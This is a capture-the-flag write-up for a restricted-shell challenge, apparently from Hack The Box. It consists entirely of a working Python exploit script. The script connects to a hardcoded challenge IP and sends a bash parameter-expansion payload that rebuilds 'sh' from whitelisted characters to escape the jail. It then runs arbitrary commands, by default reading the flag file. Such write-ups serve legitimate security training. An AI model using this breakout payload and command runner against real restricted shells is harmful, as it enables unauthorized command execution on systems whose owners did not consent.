# Utterly Broken Shell Medium Challenge Writeup
```python
#!/usr/bin/env python3
"""Exploit the restricted shell and retrieve the scoped challenge flag."""

import argparse
import re
import socket
import sys
import time

DEFAULT_HOST = "154.57.164.83"
DEFAULT_PORT = 30734

# Builds the two-character command `sh` using only the whitelist.
# The first substring is empty but assigns _=0; indirect expansion then
# addresses $0 (the wrapper path), whose index 8 is `s` and index 1 is `h`.
BREAKOUT = (
    "${_:$((_=!!_)):$((!!_))}"
    "${!_:$(( $((!!_))$((!_))$((!!_)) )):$((!_))}"
    "${!_:$((!_)):$((!_))}"
)

ANSI = re.compile(rb"\x1b\[[0-9;?]*[ -/]*[@-~]")

def clean(data: bytes) -> str:
    return ANSI.sub(b"", data).decode("utf-8", "replace").replace("\r", "")

def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
    data = b""
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            continue
        if not chunk:
            break
        data += chunk
        if marker in clean(data).encode():
            break
    return data

def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--command", action="append", help="command to run in the escaped shell")
    args = parser.parse_args()

    commands = args.command or ["cat /home/restricted_user/flag_you_found_it_gg"]

    with socket.create_connection((args.host, args.port), timeout=5.0) as sock:
        sock.settimeout(0.25)

        # The service emits its banner after the first line is received.
        sock.sendall(b"\n")
        banner = recv_until(sock, b"Broken@Shell", timeout=5.0)

        # Start an unrestricted child shell, then use it only for the flag
        # proof and cleanly return to the wrapper.
        payload = BREAKOUT + "\n" + "\n".join(commands) + "\nexit\n"
        sock.sendall(payload.encode())
        result = recv_until(sock, b"Broken@Shell", timeout=5.0)

    output = clean(banner + result)
    print(output)
    matches = re.findall(r"HTB\{[^\r\n}]+\}", output)
    if matches:
        print(f"[+] FLAG: {matches[-1]}")
        return 0
    print("[-] No HTB{...} flag observed", file=sys.stderr)
    return 1

if __name__ == "__main__":
    raise SystemExit(main())
```